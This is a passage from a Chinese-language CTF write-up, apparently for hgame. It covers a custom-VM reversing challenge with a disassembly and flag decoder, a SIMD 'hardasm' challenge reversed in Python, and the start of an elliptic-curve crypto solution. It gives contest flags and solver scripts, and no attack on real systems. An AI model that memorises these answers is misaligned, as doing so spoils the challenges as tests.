        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;dec [2]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;xor [3], [7]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;push [3]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;push [5]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">6</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;push [6]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [3]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [5]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">9</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [6]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [2]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">11</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [7]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">12</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;jz $+1+[6]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">13</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;jnz $+1+[6]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">14</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;jmp $+1+[2]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">15</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;cmp [3], [5]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">16</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;getchar([3])&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">17</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;putchar([3])&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">18</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;push *(([4]++)+0xD1)&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">19</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;mov [3], [rbp+[2]]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">20</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;mov [rbp+[2]], [3]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">21</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;add [3], [3]&#34;</span>)
</code></pre></div><p>也许跟着 log 一起看比较好，这里就直接对着 data 里的数据看了</p>
<pre tabindex="0"><code>_00:    push 0x0A
_01:    pop [5]
_02:    push -5
_03:    pop [6]

_04:    getchar([3])
_05:    push [3]
_06:    inc [2]
_07:    cmp [3], [5]
_08:    jnz $+1+[6]
_09:    dec [2]
</code></pre><p>这个 jnz 的循环是 <code>getchar()</code> 直到读取到 <code>\n</code></p>
<p>接下来是个对长度做了限制</p>
<pre tabindex="0"><code>_0A:    push 0x20
_0B:    pop [5]
_0C:    push 0x2F
_0D:    pop [6]
_0E:    mov [3], [2]
_0F:    push [3]
_10:    cmp [3], [5]
_11:    jnz $+1+[6]
</code></pre><p>这里先 add 自身，然后依次异或 data 中的数据（第一个是 0x5e）</p>
<pre tabindex="0"><code>_12:    push -10
_13:    pop [6]
_14:    push 0
_15:    pop [2]
_16:    mov [3], [rbp+[2]]
_17:    push 0x5e (next_mem)
_18:    pop [7]
_19:    add [3], [3]
_1A:    xor [3], [7]
_1B:    mov [rbp+[2]], [3]
_1C:    inc [2]
_1D:    mov [3], [2]
_1E:    cmp [3], [5]
_1F:    jnz $+1+[6]
</code></pre><p>后面就是比较了，如果不相等就会直接从第一个 jnz 直接退出，否则会判断长度来看是否退出循环</p>
<pre tabindex="0"><code>_20:    push *(([4]++)+0xD1) ; 0
_21:    pop [2]
_22:    push *(([4]++)+0xD1) ; -17
_23:    push *(([4]++)+0xD1) ; 21

_24:    push *(([4]++)+0xD1) ; 142
_25:    pop [5] ; [5] = 142
_26:    mov [3], [rbp+[2]] ; [3]=142
_27:    cmp [3], [5] ; 0
_28:    pop [3]
_29:    push [3]
_2A:    pop [6] ; 21
_2B:    jnz $+1+[6]

_2C:    pop [6] ; -17
_2D:    pop [5]
_2E:    push [5]
_2F:    push [6]
_30:    push [3]
_31:    inc [2]
_32:    mov [3], [2]
_33:    cmp [3], [5]
_34:    jnz $+1+[6]
</code></pre><p>最后一段没有看了，<code>putchar()</code> 显然是输出正确信息</p>
<p>脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> operator <span style="color:#f92672">import</span> xor


xor_list <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x0E</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x1F</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x3B</span>]

cipher <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x8E</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x0A3</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x0C4</span>, <span style="color:#ae81ff">0x0A5</span>, <span style="color:#ae81ff">0x0C3</span>, <span style="color:#ae81ff">0x0DD</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x0EC</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0x9B</span>, <span style="color:#ae81ff">0x0F3</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x9B</span>, <span style="color:#ae81ff">0x0F1</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x0F3</span>, <span style="color:#ae81ff">0x0F4</span>, <span style="color:#ae81ff">0x0A4</span>, <span style="color:#ae81ff">0x0F8</span>, <span style="color:#ae81ff">0x0F8</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x0AB</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0xC1</span>]

<span style="color:#66d9ef">for</span> x, c <span style="color:#f92672">in</span> zip(xor_list, cipher):
    print (chr((c <span style="color:#f92672">^</span> x) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
<span style="color:#75715e"># hgame{Ea$Y-Vm-t0-PrOTeCT_cOde!!}</span>
</code></pre></div><h3 id="rehardasm">[RE]hardasm</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>全是 simd，反着执行回去就行，或者可以试试正着用 z3 解</p>
<p>这个脚本因为有些指令的某一个参数是不变的（比如 <code>vpermd ymmX, ymm7, ymmX</code>），所以偷懒了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">asm <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span><span style="color:#e6db74">vpermd  ymm4, ymm7, ymm4
</span><span style="color:#e6db74">...
</span><span style="color:#e6db74">vpermd  ymm1, ymm7, ymm1&#39;&#39;&#39;</span>

ymm0 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x93\xcb\xe7\x93\xa9\x81\r\xb6\xd8\xdd\x9c\x7f\xc0</span><span style="color:#e6db74">M</span><span style="color:#ae81ff">\xcd\xf0\x00\xa0\x9f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xef</span><span style="color:#e6db74">T]</span><span style="color:#ae81ff">\xef\x00\x8d\xfe</span><span style="color:#e6db74">^L</span><span style="color:#ae81ff">\xd0\xec</span><span style="color:#e6db74">&#39;</span>
ymm1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;i</span><span style="color:#ae81ff">\xcf\x8e\xb3\xf8\x98\x90\x0b\\</span><span style="color:#e6db74">&amp;}</span><span style="color:#ae81ff">\xcf\x8c</span><span style="color:#e6db74">$</span><span style="color:#ae81ff">\x1d\x96</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x8b\xc7\xaa\xfc\xaf\xfd\x91</span><span style="color:#e6db74">F3e</span><span style="color:#ae81ff">\xb8</span><span style="color:#e6db74">#z</span><span style="color:#ae81ff">\xcd\xa5</span><span style="color:#e6db74">&#39;</span>
ymm2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\x83\xf3\xdf\xec\x00\x8e\x92</span><span style="color:#e6db74">OL</span><span style="color:#ae81ff">\x97</span><span style="color:#e6db74">O&#39;D</span><span style="color:#ae81ff">\x7f\xa4\xe3</span><span style="color:#e6db74">N</span><span style="color:#ae81ff">\xbf</span><span style="color:#e6db74">$d</span><span style="color:#ae81ff">\xdd</span><span style="color:#e6db74">*T</span><span style="color:#ae81ff">\xc3</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\xb2\x82</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\xa0\x1b\xf5</span><span style="color:#e6db74">&#34;</span>
ymm3 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb4\xc7</span><span style="color:#e6db74">lj</span><span style="color:#ae81ff">\xfb\x1f</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\xf5</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xc9\r\x1b\xb4\xe5\xff</span><span style="color:#e6db74">EN^</span><span style="color:#ae81ff">\x95</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\xef\x8e</span><span style="color:#e6db74">@</span><span style="color:#ae81ff">\x8d\x9a\xf9\xd1\x92\x8b\xbf</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xbb</span><span style="color:#e6db74">&#39;</span>
ymm4 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xca</span><span style="color:#e6db74">}6</span><span style="color:#ae81ff">\xf7\xc5\xcb\x90\xb9</span><span style="color:#e6db74">B</span><span style="color:#ae81ff">\x96\xe0\xa5</span><span style="color:#e6db74">5sL</span><span style="color:#ae81ff">\xf7\xa9\x9d\x87\xa1\xc2</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x8b\xe8\x9a</span><span style="color:#e6db74">f</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">*</span><span style="color:#ae81ff">\xe6</span><span style="color:#e6db74">%</span><span style="color:#ae81ff">\x04\xd1</span><span style="color:#e6db74">&#39;</span>
ymm5 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)</span><span style="color:#ae81ff">\x9d\x0b</span><span style="color:#e6db74">Gy</span><span style="color:#ae81ff">\x1a\xa4\x97\x02\xbf\x13\x9e\xa0\xd2\xa4</span><span style="color:#e6db74">m?_=M4</span><span style="color:#ae81ff">\xea\xee</span><span style="color:#e6db74">Ra</span><span style="color:#ae81ff">\x97</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\xb4\x04\x91\xd8</span><span style="color:#e6db74">W&#39;</span>
ymm6 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01\x08\t\n\x02\x03\x04\x05\x0c\r\x0e\x06\x07\x0b\x0f\x00\x06\x07\x08\t\n\x02\x03\x04\x05\r\x0e\x0b\x0c\x01\x0f</span><span style="color:#e6db74">&#39;</span>
ymm7 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpermd</span>(x, y):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    origin:
</span><span style="color:#e6db74">        from: b&#34;3_bh&#34; b&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">d</span><span style="color:#ae81ff">\xa8\xff\x8f\x99\xa7\x94\x9e\x9a</span><span style="color:#e6db74">)4&#34; b&#34;&#39;6</span><span style="color:#ae81ff">\xd6\x82\xc2</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\xe8\xaa</span><span style="color:#e6db74">&#34; b&#34;</span><span style="color:#ae81ff">\x96</span><span style="color:#e6db74">Je</span><span style="color:#ae81ff">\xc0\x0c</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x19\xc9</span><span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">        to  : b&#34;3_bh&#34; b&#34;&#39;6</span><span style="color:#ae81ff">\xd6\x82\xc2</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\xe8\xaa</span><span style="color:#e6db74">&#34; b&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">d</span><span style="color:#ae81ff">\xa8\xff\x8f\x99\xa7\x94\x9e\x9a</span><span style="color:#e6db74">)4&#34; b&#34;</span><span style="color:#ae81ff">\x96</span><span style="color:#e6db74">Je</span><span style="color:#ae81ff">\xc0\x0c</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x19\xc9</span><span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> y[:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> y[<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">24</span>] <span style="color:#f92672">+</span> y[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">12</span>] <span style="color:#f92672">+</span> y[<span style="color:#ae81ff">24</span>:]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpxor</span>(x, y):
    <span style="color:#66d9ef">return</span> bytes([a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(x, y)])

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpaddb</span>(x, y):
    <span style="color:#66d9ef">return</span> bytes([(a <span style="color:#f92672">-</span> b) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span> <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(x, y)])

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpsubb</span>(x, y):
    <span style="color:#66d9ef">return</span> bytes([(a <span style="color:#f92672">+</span> b) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span> <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(x, y)])

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpshufb</span>(x, y):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    origin:
</span><span style="color:#e6db74">        from: b&#39;</span><span style="color:#ae81ff">\x89\xa1</span><span style="color:#e6db74">&#39; b&#39;&gt;</span><span style="color:#ae81ff">\xc0\xe5\x14</span><span style="color:#e6db74">&#39; &#39;_</span><span style="color:#ae81ff">\xc5</span><span style="color:#e6db74">&#39; &#39;_</span><span style="color:#ae81ff">\x14\xb0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xd0</span><span style="color:#e6db74">&#39; &#39;%</span><span style="color:#ae81ff">\x1f\xe8</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xf5\xb0</span><span style="color:#e6db74">&#39; &#39;4&#39; &#39;6</span><span style="color:#ae81ff">\xc2\xc7\xa0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xb2</span><span style="color:#e6db74">&lt;^~</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xa4\x98</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xe8</span><span style="color:#e6db74">T&#39; &#39;</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">        to  : b&#39;</span><span style="color:#ae81ff">\x89\xa1</span><span style="color:#e6db74">&#39; b&#39;_</span><span style="color:#ae81ff">\x14\xb0</span><span style="color:#e6db74">&#39; &#39;&gt;</span><span style="color:#ae81ff">\xc0\xe5\x14</span><span style="color:#e6db74">&#39; &#39;%</span><span style="color:#ae81ff">\x1f\xe8</span><span style="color:#e6db74">&#39; &#39;_</span><span style="color:#ae81ff">\xc5</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xd0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xf5\xb0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xb2</span><span style="color:#e6db74">&lt;^~</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">&#39; &#39;6</span><span style="color:#ae81ff">\xc2\xc7\xa0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xe8</span><span style="color:#e6db74">T&#39; &#39;</span><span style="color:#ae81ff">\xa4\x98</span><span style="color:#e6db74">&#39; &#39;4&#39; &#39;</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> x[:<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">5</span>:<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">14</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">9</span>:<span style="color:#ae81ff">12</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">17</span>]<span style="color:#f92672">+</span> x[<span style="color:#ae81ff">30</span>:<span style="color:#ae81ff">31</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">22</span>:<span style="color:#ae81ff">26</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">17</span>:<span style="color:#ae81ff">22</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">28</span>:<span style="color:#ae81ff">30</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">26</span>:<span style="color:#ae81ff">28</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">31</span>:]

<span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> asm<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
    b <span style="color:#f92672">=</span> a<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>split()
    exec(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>b[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> = rev_</span><span style="color:#e6db74">{</span>b[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">(</span><span style="color:#e6db74">{</span>b[<span style="color:#ae81ff">2</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>b[<span style="color:#ae81ff">3</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#39;</span>)
print (ymm0)
</code></pre></div><blockquote>
<p>ida 动调的时候要知道寄存器的值，可以用 idapython 的 <code>get_reg_value(&quot;ymm0&quot;)</code>
指令不知道什么意思的话动调看一下变化就行</p>
</blockquote>
<h3 id="cryptoecc">[Crypto]ECC</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>传统的椭圆曲线加密，利用 sage 工具求解即可。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> <span style="color:#ae81ff">74997021559434065975272431626618720725838473091721936616560359000648651891507</span>
a <span style="color:#f92672">=</span> <span style="color:#ae81ff">61739043730332859978236469007948666997510544212362386629062032094925353519657</span>
b <span style="color:#f92672">=</span> <span style="color:#ae81ff">87821782818477817609882526316479721490919815013668096771992360002467657827319</span>
k <span style="color:#f92672">=</span> <span style="color:#ae81ff">93653874272176107584459982058527081604083871182797816204772644509623271061231</span>
E <span style="color:#f92672">=</span> EllipticCurve(GF(p), [a, b]) <span style="color:#75715e">#建立椭圆曲线E</span>
c1 <span style="color:#f92672">=</span> E(<span style="color:#ae81ff">14455613666211899576018835165132438102011988264607146511938249744871964946084</span>, <span style="color:#ae81ff">25506582570581289714612640493258299813803157561796247330693768146763035791942</span>)
c2 <span style="color:#f92672">=</span> E(<span style="color:#ae81ff">37554871162619456709183509122673929636457622251880199235054734523782483869931</span>, <span style="color:#ae81ff">71392055540616736539267960989304287083629288530398474590782366384873814477806</span>)
m <span style="color:#f92672">=</span> c1 <span style="color:#f92672">-</span> k <span style="color:#f92672">*</span> c2

<span style="color:#75715e"># &#34;m = (57824879640955326550732559538097319221644125075532201058220628014917816573008 : 54475275866179647254036565579467398677511796158866832907668620448532510526757 : 1)&#34;</span>

<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> invmod,n2s
m <span style="color:#f92672">=</span> [<span style="color:#ae81ff">57824879640955326550732559538097319221644125075532201058220628014917816573008</span>,<span style="color:#ae81ff">54475275866179647254036565579467398677511796158866832907668620448532510526757</span>]
cipher_left <span style="color:#f92672">=</span> <span style="color:#ae81ff">68208062402162616009217039034331142786282678107650228761709584478779998734710</span>
cipher_right <span style="color:#f92672">=</span> <span style="color:#ae81ff">27453988545002384546706933590432585006240439443312571008791835203660152890619</span>
d1 <span style="color:#f92672">=</span> invmod(m[<span style="color:#ae81ff">0</span>],p)
d2 <span style="color:#f92672">=</span> invmod(m[<span style="color:#ae81ff">1</span>],p)
